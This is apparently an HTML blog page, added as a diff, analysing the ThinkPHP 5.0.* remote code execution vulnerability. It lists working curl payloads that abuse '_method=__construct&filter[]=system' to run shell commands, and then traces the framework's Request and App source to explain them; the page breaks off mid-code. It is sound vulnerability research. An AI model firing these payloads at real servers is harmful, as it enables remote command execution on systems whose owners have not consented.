@@ -1,0 +1,2405 @@
+<!DOCTYPE html>
+<html>
+    <!-- title -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="Tianji">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Tianji">
+    <meta name="keywords" content="Thinkphp5.0.*之RCE漏洞分析 | Tianji">
+    <meta name="description" content="">
+    <meta name="Cache-Control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <title>Thinkphp5.0.*之RCE漏洞分析 · Tianji&#39;s Blog</title>
+    <!-- 设置密码 -->
+    <script>
+        (function(){
+            if('thinkphp'){
+                if (prompt('请输入文章密码','') !== 'thinkphp'){
+                    alert('密码错误！');
+                    history.back();
+                }
+            }
+        })();
+    </script>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s 1;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20180721" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="stylesheet" href="/css/mobile.css?v=20180721" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href="/assets/favicon.ico">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin="">
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin="">
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/">Tianji&#39;s Blog.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">Thinkphp5.0.*之RCE漏洞分析</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href="/">Tianji's Blog.</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="height:50vh;">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            Thinkphp5.0.*之RCE漏洞分析
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count">2,218</span> / Reading time: <span class="post-count">12 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/01/12</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;">
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">需要开启debug版本:</span><br><span class="line">payload1:</span><br><span class="line">第一次执行system:</span><br><span class="line">curl -v -d &quot;_method=__construct&amp;filter[]=system&quot; &quot;http://localhost/think/public/index.php?a=dir&quot;</span><br><span class="line"></span><br><span class="line">payload2:</span><br><span class="line">第二次执行system:</span><br><span class="line">curl -d &quot;_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=ls -al&quot; http://localhost/think/public/index.php</span><br><span class="line"></span><br><span class="line">不需要开启debug版本，但需要是完整版，很容易满足:</span><br><span class="line"> curl -v -d &quot;_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=dir&quot; &quot;http://localhost/loudong/public/index.php?s=captcha&amp;a=dir&quot;</span><br><span class="line"></span><br><span class="line">5.0.10比较特殊,既不需要开启debug,也不要求是完整版：</span><br><span class="line"> curl -v -d &quot;_method=__construct&amp;filter[]=system&amp;method=get&quot; &quot;http://localhost/loudong/public/index.php?s=index/index/index&amp;a=dir&quot;</span><br></pre></td></tr></table></figure>
+<h2 id="Thinkphp5-0-23核心板为例"><a href="#Thinkphp5-0-23核心板为例" class="headerlink" title="Thinkphp5.0.23核心板为例:"></a>Thinkphp5.0.23核心板为例:</h2><p><strong>该版本只能在开启Debug模式下，实现RCE.</strong></p>
+<p>config.php:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.................................</span><br><span class="line">// 表单请求类型伪装变量</span><br><span class="line">&apos;var_method&apos;             =&gt; &apos;_method&apos;,</span><br><span class="line">.................................</span><br></pre></td></tr></table></figure>
+<p>Request.php中的method方法:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">public function method($method = false)</span><br><span class="line">    &#123;</span><br><span class="line">        if (true === $method) &#123;</span><br><span class="line">            // 获取原始请求类型</span><br><span class="line">            return $this-&gt;server(&apos;REQUEST_METHOD&apos;) ?: &apos;GET&apos;;</span><br><span class="line">        &#125; elseif (!$this-&gt;method) &#123;</span><br><span class="line">            if (isset($_POST[Config::get(&apos;var_method&apos;)])) &#123; // 相当于 $_POST[&apos;_method&apos;]</span><br><span class="line">                $this-&gt;method = strtoupper($_POST[Config::get(&apos;var_method&apos;)]);</span><br><span class="line">                $this-&gt;&#123;$this-&gt;method&#125;($_POST);</span><br><span class="line">            &#125; elseif (isset($_SERVER[&apos;HTTP_X_HTTP_METHOD_OVERRIDE&apos;])) &#123;</span><br><span class="line">                $this-&gt;method = strtoupper($_SERVER[&apos;HTTP_X_HTTP_METHOD_OVERRIDE&apos;]);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $this-&gt;method = $this-&gt;server(&apos;REQUEST_METHOD&apos;) ?: &apos;GET&apos;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return $this-&gt;method;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>构造函数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">protected function __construct($options = [])</span><br><span class="line">    &#123;</span><br><span class="line">        foreach ($options as $name =&gt; $item) &#123;</span><br><span class="line">            if (property_exists($this, $name)) &#123;</span><br><span class="line">                $this-&gt;$name = $item;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if (is_null($this-&gt;filter)) &#123;</span><br><span class="line">            $this-&gt;filter = Config::get(&apos;default_filter&apos;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 保存 php://input</span><br><span class="line">        $this-&gt;input = file_get_contents(&apos;php://input&apos;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>遍历所有参数，如果是类属性，则对该类对应属性赋值。</p>
+<p>在App类（thinkphp/library/think/App.php）中module方法增加了设置filter参数值的代码，用于初始化filter。因此通过上述请求设置的filter参数值会被重新覆盖为空导致无法利用。</p>
+<p>在启动Debug模式之后，会调用param方法：</p>
+<p>param方法:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">public function param($name = &apos;&apos;, $default = null, $filter = &apos;&apos;)</span><br><span class="line">    &#123;</span><br><span class="line">        if (empty($this-&gt;mergeParam)) &#123;</span><br><span class="line">            $method = $this-&gt;method(true);</span><br><span class="line">            // 自动获取请求变量</span><br><span class="line">            switch ($method) &#123;</span><br><span class="line">                case &apos;POST&apos;:</span><br><span class="line">                    $vars = $this-&gt;post(false);</span><br><span class="line">                    break;</span><br><span class="line">                case &apos;PUT&apos;:</span><br><span class="line">                case &apos;DELETE&apos;:</span><br><span class="line">                case &apos;PATCH&apos;:</span><br><span class="line">                    $vars = $this-&gt;put(false);</span><br><span class="line">                    break;</span><br><span class="line">                default:</span><br><span class="line">                    $vars = [];</span><br><span class="line">            &#125;</span><br><span class="line">            // 当前请求参数和URL地址中的参数合并</span><br><span class="line">            $this-&gt;param      = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));</span><br><span class="line">            $this-&gt;mergeParam = true;</span><br><span class="line">        &#125;</span><br><span class="line">        if (true === $name) &#123;</span><br><span class="line">            // 获取包含文件上传信息的数组</span><br><span class="line">            $file = $this-&gt;file();</span><br><span class="line">            $data = is_array($file) ? array_merge($this-&gt;param, $file) : $this-&gt;param;</span><br><span class="line">            return $this-&gt;input($data, &apos;&apos;, $default, $filter);</span><br><span class="line">        &#125;</span><br><span class="line">        return $this-&gt;input($this-&gt;param, $name, $default, $filter);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>param方法首先会调用<code>$method = $this-&gt;method(true);</code>:</p>
+<p>server方法:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public function server($name = &apos;&apos;, $default = null, $filter = &apos;&apos;)</span><br><span class="line">    &#123;</span><br><span class="line">        if (empty($this-&gt;server)) &#123;</span><br><span class="line">            $this-&gt;server = $_SERVER;</span><br><span class="line">        &#125;</span><br><span class="line">        if (is_array($name)) &#123;</span><br><span class="line">            return $this-&gt;server = array_merge($this-&gt;server, $name);</span><br><span class="line">        &#125;</span><br><span class="line">        //在当前payload下，第一次执行该方法时，$this-&gt;server= [&apos;REQUEST_METHOD&apos; =&gt; &apos;dir&apos;]</span><br><span class="line">        return $this-&gt;input($this-&gt;server, false === $name ? false : strtoupper($name), $default, $filter);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>server方法会调用input方法:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public function input($data = [], $name = &apos;&apos;, $default = null, $filter = &apos;&apos;)</span><br><span class="line">   &#123;</span><br><span class="line">       ...................................</span><br><span class="line">       // 解析过滤器</span><br><span class="line">       $filter = $this-&gt;getFilter($filter, $default);</span><br><span class="line"></span><br><span class="line">       if (is_array($data)) &#123;</span><br><span class="line">           array_walk_recursive($data, [$this, &apos;filterValue&apos;], $filter);</span><br><span class="line">           reset($data);</span><br><span class="line">       &#125; else &#123;</span><br><span class="line">           $this-&gt;filterValue($data, $name, $filter);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">     ..............................................</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<p>这里<code>$filter = $this-&gt;getFilter($filter, $default);</code>调用<code>getFilter</code>方法:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">protected function getFilter($filter, $default)</span><br><span class="line">    &#123;</span><br><span class="line">        if (is_null($filter)) &#123;</span><br><span class="line">            $filter = [];</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $filter = $filter ?: $this-&gt;filter;</span><br><span class="line">            if (is_string($filter) &amp;&amp; false === strpos($filter, &apos;/&apos;)) &#123;</span><br><span class="line">                $filter = explode(&apos;,&apos;, $filter);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $filter = (array) $filter;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $filter[] = $default;</span><br><span class="line">        return $filter;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到这里如果<code>$filter</code>为空，就会对<code>$filter</code>进行赋值，也就是<code>$this-&gt;filter</code>，可以控制。</p>
+<p>至此，可构造payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -d &quot;_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=ls -al&quot; http://localhost/think/public/index.php</span><br></pre></td></tr></table></figure>
+<p>继续看，</p>
+<p>param函数最终会调用input方法:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public function param($name = &apos;&apos;, $default = null, $filter = &apos;&apos;)</span><br><span class="line">    &#123;</span><br><span class="line">      .........................................</span><br><span class="line">        return $this-&gt;input($this-&gt;param, $name, $default, $filter);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p><code>$this-&gt;param</code> 就是<code>get</code>参数，参数名无所谓:</p>
+<p>构造payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -d &quot;_method=__construct&amp;filter[]=system&quot; http://localhost/think/public/index.php?a=dir</span><br></pre></td></tr></table></figure>
+<h2 id="Thinkphp5-0-22完整板为例"><a href="#Thinkphp5-0-22完整板为例" class="headerlink" title="Thinkphp5.0.22完整板为例:"></a>Thinkphp5.0.22完整板为例:</h2><p><strong>该版本可以在不开启Debug模式的情况下实现RCE</strong></p>
+<p>run方法:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">public static function run(Request $request = null)</span><br><span class="line">    &#123;</span><br><span class="line">        $request = is_null($request) ? Request::instance() : $request;</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            $config = self::initCommon();</span><br><span class="line"></span><br><span class="line">            // 模块/控制器绑定</span><br><span class="line">            if (defined(&apos;BIND_MODULE&apos;)) &#123;</span><br><span class="line">                BIND_MODULE &amp;&amp; Route::bind(BIND_MODULE);</span><br><span class="line">            &#125; elseif ($config[&apos;auto_bind_module&apos;]) &#123;</span><br><span class="line">                // 入口自动绑定</span><br><span class="line">                $name = pathinfo($request-&gt;baseFile(), PATHINFO_FILENAME);</span><br><span class="line">                if ($name &amp;&amp; &apos;index&apos; != $name &amp;&amp; is_dir(APP_PATH . $name)) &#123;</span><br><span class="line">                    Route::bind($name);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $request-&gt;filter($config[&apos;default_filter&apos;]);</span><br><span class="line"></span><br><span class="line">            // 默认语言</span><br><span class="line">            Lang::range($config[&apos;default_lang&apos;]);</span><br><span class="line">            // 开启多语言机制 检测当前语言</span><br><span class="line">            $config[&apos;lang_switch_on&apos;] &amp;&amp; Lang::detect();</span><br><span class="line">            $request-&gt;langset(Lang::range());</span><br><span class="line"></span><br><span class="line">            // 加载系统语言包</span><br><span class="line">            Lang::load([</span><br><span class="line">                THINK_PATH . &apos;lang&apos; . DS . $request-&gt;langset() . EXT,</span><br><span class="line">                APP_PATH . &apos;lang&apos; . DS . $request-&gt;langset() . EXT,</span><br><span class="line">            ]);</span><br><span class="line"></span><br><span class="line">            // 监听 app_dispatch</span><br><span class="line">            Hook::listen(&apos;app_dispatch&apos;, self::$dispatch);</span><br><span class="line">            // 获取应用调度信息</span><br><span class="line">            $dispatch = self::$dispatch;</span><br><span class="line"></span><br><span class="line">            // 未设置调度信息则进行 URL 路由检测</span><br><span class="line">            if (empty($dispatch)) &#123;</span><br><span class="line">                $dispatch = self::routeCheck($request, $config);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            // 记录当前调度信息</span><br><span class="line">            $request-&gt;dispatch($dispatch);</span><br><span class="line"></span><br><span class="line">            // 记录路由和请求信息</span><br><span class="line">            if (self::$debug) &#123;</span><br><span class="line">                Log::record(&apos;[ ROUTE ] &apos; . var_export($dispatch, true), &apos;info&apos;);</span><br><span class="line">                Log::record(&apos;[ HEADER ] &apos; . var_export($request-&gt;header(), true), &apos;info&apos;);</span><br><span class="line">                Log::record(&apos;[ PARAM ] &apos; . var_export($request-&gt;param(), true), &apos;info&apos;);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            // 监听 app_begin</span><br><span class="line">            Hook::listen(&apos;app_begin&apos;, $dispatch);</span><br><span class="line"></span><br><span class="line">            // 请求缓存检查</span><br><span class="line">            $request-&gt;cache(</span><br><span class="line">                $config[&apos;request_cache&apos;],</span><br><span class="line">                $config[&apos;request_cache_expire&apos;],</span><br><span class="line">                $config[&apos;request_cache_except&apos;]</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">            $data = self::exec($dispatch, $config);</span><br><span class="line">        &#125; catch (HttpResponseException $exception) &#123;</span><br><span class="line">            $data = $exception-&gt;getResponse();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 清空类的实例化</span><br><span class="line">        Loader::clearInstance();</span><br><span class="line"></span><br><span class="line">        // 输出数据到客户端</span><br><span class="line">        if ($data instanceof Response) &#123;</span><br><span class="line">            $response = $data;</span><br><span class="line">        &#125; elseif (!is_null($data)) &#123;</span><br><span class="line">            // 默认自动识别响应输出类型</span><br><span class="line">            $type = $request-&gt;isAjax() ?</span><br><span class="line">            Config::get(&apos;default_ajax_return&apos;) :</span><br><span class="line">            Config::get(&apos;default_return_type&apos;);</span><br><span class="line"></span><br><span class="line">            $response = Response::create($data, $type);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $response = 